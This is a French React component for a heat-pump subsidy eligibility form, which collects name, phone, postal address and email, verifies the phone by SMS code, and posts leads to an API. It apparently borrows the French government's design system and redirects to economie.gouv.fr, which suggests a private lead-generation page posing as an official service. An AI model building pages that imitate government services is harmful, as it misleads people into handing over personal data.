"use client";

import { useEffect, useRef, useState } from "react";

interface LeadFormData {
  statutOccupation: "proprietaire" | "locataire" | "";
  typeLogement: "maison" | "appartement" | "";
  nomComplet: string;
  telephone: string;
  codePostal: string;
  adresse: string;
  email?: string;
  leadId?: string;
  otpVerified?: boolean;
  otpStatus?: "pending" | "verified";
}

type FormStep = "form" | "otp" | "success";

export default function LeadForm() {
  const sectionRef = useRef<HTMLElement | null>(null);
  const [formData, setFormData] = useState<LeadFormData>({
    statutOccupation: "",
    typeLogement: "",
    nomComplet: "",
    telephone: "",
    codePostal: "",
    adresse: "",
    email: "",
  });
  const [currentStep, setCurrentStep] = useState<FormStep>("form");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSendingOTP, setIsSendingOTP] = useState(false);
  const [isVerifyingOTP, setIsVerifyingOTP] = useState(false);
  const [otpCode, setOtpCode] = useState("");
  const [submitError, setSubmitError] = useState<string>("");
  const [otpInfo, setOtpInfo] = useState<string>("");
  const [leadId, setLeadId] = useState<string>("");
  const isNotEligible =
    formData.statutOccupation === "locataire" || formData.typeLogement === "appartement";

  useEffect(() => {
    if (currentStep !== "otp" && currentStep !== "success") {
      return;
    }

    const section = sectionRef.current;
    if (!section) {
      return;
    }

    const scrollToSection = () => {
      const y = section.getBoundingClientRect().top + window.scrollY - 80;
      window.scrollTo({ top: y, behavior: "smooth" });
    };

    requestAnimationFrame(scrollToSection);
    setTimeout(scrollToSection, 0);
  }, [currentStep]);

  const formatPhoneNumber = (value: string): string => {
    const cleaned = value.replace(/\D/g, "");
    const limited = cleaned.slice(0, 10);
    
    if (limited.length === 0) return "";
    if (limited.length <= 2) return limited;
    if (limited.length <= 4) return `${limited.slice(0, 2)} ${limited.slice(2)}`;
    if (limited.length <= 6) return `${limited.slice(0, 2)} ${limited.slice(2, 4)} ${limited.slice(4)}`;
    if (limited.length <= 8) return `${limited.slice(0, 2)} ${limited.slice(2, 4)} ${limited.slice(4, 6)} ${limited.slice(6)}`;
    return `${limited.slice(0, 2)} ${limited.slice(2, 4)} ${limited.slice(4, 6)} ${limited.slice(6, 8)} ${limited.slice(8)}`;
  };

  const createLeadId = () => {
    if (typeof crypto !== "undefined" && "randomUUID" in crypto) {
      return crypto.randomUUID();
    }
    return `lead_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
  };

  const sendOtpRequest = async (moveToOtp: boolean) => {
    setSubmitError("");
    setOtpInfo("");
    setIsSendingOTP(true);

    try {
      const otpResponse = await fetch("/api/otp", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ telephone: formData.telephone }),
      });

      const otpData = await otpResponse.json();

      if (!otpResponse.ok) {
        throw new Error(otpData.error || "Erreur lors de l'envoi du code OTP");
      }

      setOtpInfo("Code envoyé par SMS. Il est valide 5 minutes.");
      if (moveToOtp) {
        setCurrentStep("otp");
      }
    } catch (error) {
      setSubmitError(error instanceof Error ? error.message : "Une erreur est survenue. Veuillez réessayer.");
    } finally {
      setIsSendingOTP(false);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setSubmitError("");
    setOtpInfo("");
    setIsSubmitting(true);

    const currentLeadId = leadId || createLeadId();
    setLeadId(currentLeadId);

    try {
      const leadResponse = await fetch("/api/leads", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          ...formData,
          leadId: currentLeadId,
          otpVerified: false,
          otpStatus: "pending",
        }),
      });

      const leadData = await leadResponse.json();

      if (!leadResponse.ok) {
        throw new Error(leadData.error || "Erreur lors de l'envoi du formulaire");
      }

      await sendOtpRequest(true);
    } catch (error) {
      setSubmitError(error instanceof Error ? error.message : "Une erreur est survenue. Veuillez réessayer.");
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleOTPSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setSubmitError("");
    setIsVerifyingOTP(true);

    try {
      // Vérifier le code OTP
      const verifyResponse = await fetch("/api/otp", {
        method: "PUT",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          telephone: formData.telephone,
          code: otpCode,
        }),
      });

      const verifyData = await verifyResponse.json();

      if (!verifyResponse.ok) {
        throw new Error(verifyData.error || "Code OTP incorrect");
      }

      // Code OTP valide, mettre à jour le lead
      const leadResponse = await fetch("/api/leads", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          ...formData,
          leadId: leadId || createLeadId(),
          otpVerified: true,
          otpStatus: "verified",
        }),
      });

      const leadData = await leadResponse.json();

      if (!leadResponse.ok) {
        throw new Error(leadData.error || "Erreur lors de l'envoi du formulaire");
      }

      // Succès
      setCurrentStep("success");
      
      if (!isNotEligible) {
        // Redirection après 2 secondes
        setTimeout(() => {
          window.location.href = "https://www.economie.gouv.fr/particuliers";
        }, 2000);
      }
    } catch (error) {
      setSubmitError(error instanceof Error ? error.message : "Une erreur est survenue. Veuillez réessayer.");
      setOtpCode(""); // Réinitialiser le code en cas d'erreur
    } finally {
      setIsVerifyingOTP(false);
    }
  };

  const handleResendOTP = async () => {
    setOtpCode("");
    await sendOtpRequest(false);
  };

  if (currentStep === "success") {
    return (
      <section ref={sectionRef} className="section-spacing" id="formulaire-eligibilite" style={{ backgroundColor: "#f6f6f6" }} tabIndex={-1}>
        <div className="fr-container">
          <div className="fr-grid-row fr-grid-row--center">
            <div className="fr-col-12 fr-col-md-8">
              <div
                className={`fr-alert ${isNotEligible ? "fr-alert--error" : "fr-alert--success"} fr-mb-4w`}
                role="alert"
              >
                <h3 className="fr-alert__title">
                  {isNotEligible ? "Non éligible aux aides" : "Demande enregistrée"}
                </h3>
                {isNotEligible ? (
                  <p>
                    Selon les informations fournies, les aides ne sont pas disponibles pour les locataires
                    ou les appartements.
                  </p>
                ) : (
                  <p>
                    Votre demande a été enregistrée avec succès. Vous allez être redirigé dans quelques instants.
                  </p>
                )}
              </div>
            </div>
          </div>
        </div>
      </section>
    );
  }

  if (currentStep === "otp") {
    return (
      <section ref={sectionRef} className="section-spacing form-section-mobile" id="formulaire-eligibilite" style={{ backgroundColor: "#f6f6f6" }} tabIndex={-1}>
        <div className="fr-container">
          <div className="fr-grid-row fr-grid-row--center">
            <div className="fr-col-12 fr-col-md-10 fr-col-lg-8">
              <h2 className="fr-h2 fr-mb-2w fr-mb-md-3w">Vérification du code</h2>
              <p className="fr-text fr-mb-3w fr-mb-md-4w">
                Un code de vérification à 4 chiffres a été envoyé au numéro {formData.telephone}. Il est valide 5 minutes.
              </p>

              <form onSubmit={handleOTPSubmit} noValidate className="form-mobile-optimized">
                <div className="fr-input-group">
                  <label className="fr-label" htmlFor="otp-code">
                    Code de vérification <span className="fr-hint-text">(obligatoire)</span>
                  </label>
                  <input
                    className="fr-input"
                    type="text"
                    id="otp-code"
                    name="otpCode"
                    value={otpCode}
                    onChange={(e) => {
                      const value = e.target.value.replace(/\D/g, "").slice(0, 4);
                      setOtpCode(value);
                    }}
                    required
                    maxLength={4}
                    pattern="[0-9]{4}"
                    inputMode="numeric"
                    autoComplete="one-time-code"
                    placeholder="1234"
                    autoFocus
                  />
                  <p className="fr-hint-text">
                    Format : 4 chiffres
                  </p>
                </div>

                {otpInfo && (
                  <div className="fr-alert fr-alert--success fr-mt-3w fr-mt-md-4w" role="alert">
                    <p>{otpInfo}</p>
                  </div>
                )}

                {submitError && (
                  <div className="fr-alert fr-alert--error fr-mt-3w fr-mt-md-4w" role="alert">
                    <p>{submitError}</p>
                  </div>
                )}

                <div className="fr-btns-group fr-btns-group--right fr-mt-4w fr-mt-md-5w">
                  <button
                    type="button"
                    className="fr-btn fr-btn--secondary"
                    onClick={handleResendOTP}
                    disabled={isSendingOTP}
                    aria-label="Renvoyer le code"
                  >
                    {isSendingOTP ? "Envoi du code..." : "Renvoyer le code"}
                  </button>
                  <button
                    type="button"
                    className="fr-btn fr-btn--secondary"
                    onClick={() => {
                      setCurrentStep("form");
                      setOtpCode("");
                      setSubmitError("");
                      setOtpInfo("");
                    }}
                  >
                    Retour
                  </button>
                  <button
                    type="submit"
                    className="fr-btn fr-btn--primary"
                    disabled={isVerifyingOTP || otpCode.length !== 4}
                    aria-label="Vérifier le code"
                  >
                    {isVerifyingOTP ? "Vérification en cours..." : "Vérifier le code"}
                  </button>
                </div>
              </form>
            </div>
          </div>
        </div>
      </section>
    );
  }

  return (
    <section ref={sectionRef} className="section-spacing form-section-mobile" id="formulaire-eligibilite" style={{ backgroundColor: "#f6f6f6" }} tabIndex={-1}>
      <div className="fr-container">
        <div className="fr-grid-row fr-grid-row--center">
          <div className="fr-col-12 fr-col-md-10 fr-col-lg-8">
            <h2 className="fr-h2 fr-mb-2w fr-mb-md-3w">Vérifier votre éligibilité</h2>
            <p className="fr-text fr-mb-3w fr-mb-md-4w">
              Remplissez le formulaire ci-dessous pour vérifier votre éligibilité aux aides pour l'installation d'une pompe à chaleur.
            </p>

            <form onSubmit={handleSubmit} noValidate className="form-mobile-optimized">
              <div className="fr-input-group">
                <label className="fr-label">
                  Statut d'occupation <span className="fr-hint-text">(obligatoire)</span>
                </label>
                <div className="choice-grid">
                  <button
                    type="button"
                    className={`choice-card ${
                      formData.statutOccupation === "proprietaire" ? "choice-card--selected" : ""
                    }`}
                    aria-pressed={formData.statutOccupation === "proprietaire"}
                    onClick={() => setFormData({ ...formData, statutOccupation: "proprietaire" })}
                  >
                    Propriétaire
                  </button>
                  <button
                    type="button"
                    className={`choice-card ${
                      formData.statutOccupation === "locataire" ? "choice-card--selected" : ""
                    }`}
                    aria-pressed={formData.statutOccupation === "locataire"}
                    onClick={() => setFormData({ ...formData, statutOccupation: "locataire" })}
                  >
                    Locataire
                  </button>
                </div>
                <input type="hidden" name="statutOccupation" value={formData.statutOccupation} required />
              </div>

              <div className="fr-input-group fr-mt-3w fr-mt-md-4w">
                <label className="fr-label">
                  Type de logement <span className="fr-hint-text">(obligatoire)</span>
                </label>
                <div className="choice-grid">
                  <button
                    type="button"
                    className={`choice-card ${formData.typeLogement === "maison" ? "choice-card--selected" : ""}`}
                    aria-pressed={formData.typeLogement === "maison"}
                    onClick={() => setFormData({ ...formData, typeLogement: "maison" })}
                  >
                    Maison
                  </button>
                  <button
                    type="button"
                    className={`choice-card ${
                      formData.typeLogement === "appartement" ? "choice-card--selected" : ""
                    }`}
                    aria-pressed={formData.typeLogement === "appartement"}
                    onClick={() => setFormData({ ...formData, typeLogement: "appartement" })}
                  >
                    Appartement
                  </button>
                </div>
                <input type="hidden" name="typeLogement" value={formData.typeLogement} required />
              </div>

              <div className="fr-input-group">
                <label className="fr-label" htmlFor="nom-complet">
                  Nom et prénom <span className="fr-hint-text">(obligatoire)</span>
                </label>
                <input
                  className="fr-input"
                  type="text"
                  id="nom-complet"
                  name="nomComplet"
                  value={formData.nomComplet}
                  onChange={(e) => setFormData({ ...formData, nomComplet: e.target.value })}
                  required
                  autoComplete="name"
                />
              </div>

              <div className="fr-input-group fr-mt-3w fr-mt-md-4w">
                <label className="fr-label" htmlFor="telephone">
                  Téléphone <span className="fr-hint-text">(obligatoire)</span>
                </label>
                <input
                  className="fr-input"
                  type="tel"
                  id="telephone"
                  name="telephone"
                  value={formData.telephone}
                  onChange={(e) => {
                    const formatted = formatPhoneNumber(e.target.value);
                    setFormData({ ...formData, telephone: formatted });
                  }}
                  required
                  inputMode="tel"
                  autoComplete="tel"
                  maxLength={14}
                  placeholder="01 23 45 67 89"
                />
                <p className="fr-hint-text">
                  Format : 01 23 45 67 89
                </p>
              </div>

              <div className="fr-input-group fr-mt-3w fr-mt-md-4w">
                <label className="fr-label" htmlFor="code-postal">
                  Code postal <span className="fr-hint-text">(obligatoire)</span>
                </label>
                <input
                  className="fr-input"
                  type="text"
                  id="code-postal"
                  name="codePostal"
                  value={formData.codePostal}
                  onChange={(e) => {
                    const value = e.target.value.replace(/\D/g, "").slice(0, 5);
                    setFormData({ ...formData, codePostal: value });
                  }}
                  required
                  maxLength={5}
                  pattern="[0-9]{5}"
                  inputMode="numeric"
                  autoComplete="postal-code"
                  placeholder="75001"
                />
                <p className="fr-hint-text">
                  Format : 5 chiffres (exemple : 75001)
                </p>
              </div>

              <div className="fr-input-group fr-mt-3w fr-mt-md-4w">
                <label className="fr-label" htmlFor="adresse">
                  Adresse <span className="fr-hint-text">(obligatoire)</span>
                </label>
                <input
                  className="fr-input"
                  type="text"
                  id="adresse"
                  name="adresse"
                  value={formData.adresse}
                  onChange={(e) => setFormData({ ...formData, adresse: e.target.value })}
                  required
                  autoComplete="street-address"
                  placeholder="Numéro et nom de rue"
                />
              </div>

              <div className="fr-input-group fr-mt-3w fr-mt-md-4w">
                <label className="fr-label" htmlFor="email">
                  Email <span className="fr-hint-text">(optionnel)</span>
                </label>
                <input
                  className="fr-input"
                  type="email"
                  id="email"
                  name="email"
                  value={formData.email}
                  onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                  autoComplete="email"
                />
              </div>

              <div className="fr-alert fr-alert--info fr-mt-4w fr-mt-md-5w">
                <p className="fr-alert__title">Protection des données personnelles</p>
                <p className="fr-text--sm fr-mt-2w">
                  Les informations recueillies sont utilisées uniquement dans le cadre de cette démarche de vérification d'éligibilité aux aides publiques. Elles sont traitées conformément à la réglementation en vigueur sur la protection des données personnelles.
                </p>
              </div>

              {submitError && (
                <div className="fr-alert fr-alert--error fr-mt-3w fr-mt-md-4w" role="alert">
                  <p>{submitError}</p>
                </div>
              )}

              <div className="fr-btns-group fr-btns-group--right fr-mt-4w fr-mt-md-5w">
                <button
                  type="submit"
                  className="fr-btn fr-btn--primary"
                  disabled={isSubmitting}
                  aria-label="Soumettre le formulaire"
                >
                  {isSubmitting ? "Envoi en cours..." : "Vérifier mon éligibilité"}
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </section>
  );
}
